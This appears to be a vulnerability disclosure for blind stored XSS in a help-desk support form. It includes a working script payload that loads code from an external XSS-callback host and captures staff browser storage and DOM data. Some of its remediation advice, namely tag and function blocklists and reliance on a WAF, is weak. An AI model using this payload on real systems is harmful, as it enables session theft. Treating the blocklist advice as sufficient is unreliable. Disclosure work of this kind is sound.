## Title
Blind XSS - DeskFlow Help Center

## Description
**Affected URL:** https://deskflow.pwnedbox.site/

A Blind Stored Cross-Site Scripting (XSS) vulnerability was identified in the DeskFlow Help Center support ticket functionality. The application accepts JavaScript payloads in the **Your name**, **Subject**, and **Description** fields without properly sanitizing the submitted input. The payload is stored in the support ticket and executes when a staff member views the ticket in the administrative workspace. The execution was verified through an external XSS callback, demonstrating that the injected script runs in the staff user's browser context.

## Steps to Reproduce

1. Open the support request page: https://deskflow.pwnedbox.site/request.php
2. Enter a valid email address in the Email address field.
3. In the **Your name**, **Subject**, and **Description** fields, enter the following payload:`"><script src=https://xss.report/c/priyanshxop></script>`
4. Click Send request to submit the support ticket.
5. Open the ticket tracking page and locate the submitted request.
6. Sign in to the staff workspace and open the submitted ticket.
7. Observe that the stored payload is rendered in the ticket details.
8. Verify the Blind XSS callback at https://xss.report/ under the activity/dashboard section.


## POC (Proof of Concept)

Screenshot 1: Support request form with the payload entered in the Your name, Subject, and Description fields.

<img width="1918" height="972" alt="image" src="https://github.com/user-attachments/assets/89e78f01-9db6-4b5d-afc6-12b07e348df0" />

Screenshot 2: Submitted support ticket displayed on the ticket tracking page.

<img width="1912" height="968" alt="image" src="https://github.com/user-attachments/assets/fdfa1505-d462-45c1-a507-6935d6b20b52" />

Screenshot 3: DeskFlow staff workspace login page.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/c7956233-e598-4f8b-b462-d25cbbe76992" />

Screenshot 4: Staff ticket view displaying the injected payload in the ticket content.

<img width="1918" height="963" alt="image" src="https://github.com/user-attachments/assets/1f434fa9-d1c3-4474-b331-d89d3749cad0" />

Screenshot 5: XSS Report activity showing callbacks from the DeskFlow administrative pages.

<img width="1917" height="970" alt="image" src="https://github.com/user-attachments/assets/79ea9872-7602-4956-b38b-04c451b78c9c" />

Screenshot 6: XSS Report callback details showing collected browser data, including session storage, local storage, and DOM information.

<img width="1917" height="958" alt="image" src="https://github.com/user-attachments/assets/f366d3bb-0883-4c50-bfbf-7fca8abdfecf" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
